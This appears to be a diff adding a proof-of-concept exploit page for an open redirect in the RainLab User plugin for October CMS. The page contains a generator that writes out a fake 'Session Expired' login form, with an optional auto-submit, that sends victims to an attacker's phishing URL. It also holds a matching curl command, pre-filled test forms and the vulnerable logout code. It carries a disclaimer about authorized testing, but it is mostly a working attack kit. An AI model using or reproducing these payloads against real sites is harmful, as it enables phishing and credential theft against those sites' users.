@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>RainLab User Plugin - Open Redirect PoC</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 40px;
+            background: #1a1a2e;
+            color: #eee;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: #16213e;
+            padding: 30px;
+            border-radius: 10px;
+            border: 1px solid #0f3460;
+        }
+        h1 { color: #e94560; }
+        h2 { color: #00ff88; }
+        .warning {
+            background: #e94560;
+            color: white;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 4px;
+            background: #0f3460;
+            color: #fff;
+            font-size: 14px;
+        }
+        button {
+            background: #e94560;
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 5px;
+        }
+        button:hover { background: #ff6b6b; }
+        pre {
+            background: #0f3460;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            color: #00ff88;
+        }
+        code {
+            background: #0f3460;
+            padding: 2px 8px;
+            border-radius: 3px;
+        }
+        .test-section {
+            background: #0f3460;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Open Redirect PoC</h1>
+        <p><strong>RainLab User Plugin for October CMS</strong></p>
+
+        <div class="warning">
+            <strong>DISCLAIMER:</strong> This PoC is for authorized security testing only.
+            Only test against systems you have explicit permission to test.
+        </div>
+
+        <h2>Vulnerability Details</h2>
+        <ul>
+            <li><strong>File:</strong> <code>components/Session.php</code></li>
+            <li><strong>Functions:</strong> <code>onLogout()</code>, <code>onStopImpersonating()</code></li>
+            <li><strong>Parameter:</strong> <code>redirect</code> (POST)</li>
+            <li><strong>Type:</strong> CWE-601 Open Redirect</li>
+        </ul>
+
+        <div class="test-section">
+            <h2>Interactive PoC Generator</h2>
+
+            <label>Target October CMS URL:</label>
+            <input type="text" id="target" placeholder="https://target-site.com" value="https://TARGET.com">
+
+            <label>Malicious Redirect URL:</label>
+            <input type="text" id="redirect" placeholder="https://evil-site.com" value="https://evil-phishing.com/fake-login">
+
+            <br><br>
+            <button onclick="generateForm()">Generate HTML Exploit</button>
+            <button onclick="generateCurl()">Generate cURL Command</button>
+        </div>
+
+        <h2>Generated Exploit</h2>
+        <pre id="output">Click a button above to generate exploit code...</pre>
+
+        <h2>Quick Test Buttons</h2>
+        <p>These forms demonstrate the vulnerability (change TARGET to real site):</p>
+
+        <form action="https://TARGET.com/" method="POST" style="display: inline;">
+            <input type="hidden" name="_handler" value="onLogout" />
+            <input type="hidden" name="redirect" value="https://google.com" />
+            <button type="submit">Test: Redirect to Google</button>
+        </form>
+
+        <form action="https://TARGET.com/" method="POST" style="display: inline;">
+            <input type="hidden" name="_handler" value="onLogout" />
+            <input type="hidden" name="redirect" value="https://evil-example.com" />
+            <button type="submit">Test: Redirect to evil-example.com</button>
+        </form>
+
+        <h2>Vulnerable Code</h2>
+        <pre>
+// components/Session.php - Line 168-170
+public function onLogout()
+{
+    if ($redirectUrl = post('redirect', Request::fullUrl())) {
+        return Redirect::to($redirectUrl);  // NO VALIDATION!
+    }
+}
+        </pre>
+    </div>
+
+    <script>
+    function generateForm() {
+        const target = document.getElementById('target').value;
+        const redirect = document.getElementById('redirect').value;
+
+        const html = `&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;body&gt;
+&lt;h1&gt;Session Expired - Please Login Again&lt;/h1&gt;
+&lt;form action="${target}" method="POST" id="exploit"&gt;
+    &lt;input type="hidden" name="_handler" value="onLogout" /&gt;
+    &lt;input type="hidden" name="redirect" value="${redirect}" /&gt;
+    &lt;button type="submit"&gt;Click to Continue&lt;/button&gt;
+&lt;/form&gt;
+
+&lt;!-- Auto-submit (uncomment to use):
+&lt;script&gt;document.getElementById('exploit').submit();&lt;/script&gt;
+--&gt;
+&lt;/body&gt;
+&lt;/html&gt;`;
+
+        document.getElementById('output').textContent = html;
+    }
+
+    function generateCurl() {
+        const target = document.getElementById('target').value;
+        const redirect = document.getElementById('redirect').value;
+
+        const curl = `curl -X POST "${target}" \\
+  -H "X-OCTOBER-REQUEST-HANDLER: onLogout" \\
+  -H "X-Requested-With: XMLHttpRequest" \\
+  -H "Content-Type: application/x-www-form-urlencoded" \\
+  -d "redirect=${encodeURIComponent(redirect)}" \\
+  -v 2>&1 | grep -i "location"
+
+# Expected output:
+# < Location: ${redirect}`;
+
+        document.getElementById('output').textContent = curl;
+    }
+    </script>
+</body>
+</html>
